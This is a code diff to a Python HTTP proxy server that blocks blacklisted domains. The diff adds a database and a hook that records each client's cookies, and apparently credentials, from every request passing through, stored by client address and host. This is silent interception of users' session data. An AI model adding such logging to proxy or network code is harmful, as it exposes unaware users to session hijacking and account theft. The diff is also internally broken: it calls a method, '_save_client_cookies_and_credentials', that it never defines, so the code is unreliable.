@@ -3,13 +3,15 @@ from threading import Thread
 
 from proxy_server.proxy_server_abstract import ProxyServerAbstract, CONNECTION_TIMEOUT, MAX_CONNECTIONS, MAX_REQUEST_LEN
 from utils.http_headers import HttpHeaders
+from utils.proxy_db_utils import ProxyDbUtils
 
 
 class ProxyServer(ProxyServerAbstract):
-    def __init__(self, host: str, port: int):
+    def __init__(self, host: str, port: int, db=ProxyDbUtils()):
         super().__init__(host, port)
         with open('data/domains_blacklist') as blacklist:
             self._blacklist = blacklist.readlines()
+        self._db = db
         self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.__server_socket.bind((self._host, self._port))
@@ -34,6 +36,7 @@ class ProxyServer(ProxyServerAbstract):
         try:
             request = client_connection.recv(MAX_REQUEST_LEN)
             headers = HttpHeaders(request)
+            self._save_client_cookies_and_credentials(headers, client_address)
             (hostname, port) = headers.get_host_name_and_port()
             for domain in self._blacklist:
                 if hostname.decode() in domain:
@@ -89,3 +92,12 @@ class ProxyServer(ProxyServerAbstract):
         with open('../data/human_rights.html') as human_rights_page:
             for line in human_rights_page.readlines():
                 client_connection.send(line.encode())
+
+    def _save_client_cookies(self, headers: HttpHeaders, client_address):
+        self._db.add_client(client_address)
+        cookies = headers.get_cookies()
+        for cookie in cookies:
+            self._db.add_cookie(client_address, cookie[0], cookie[1], headers.get_host())
+
+    def _save_client_credentials(self, headers: HttpHeaders, client_address):
+        self._db.add_client(client_address)
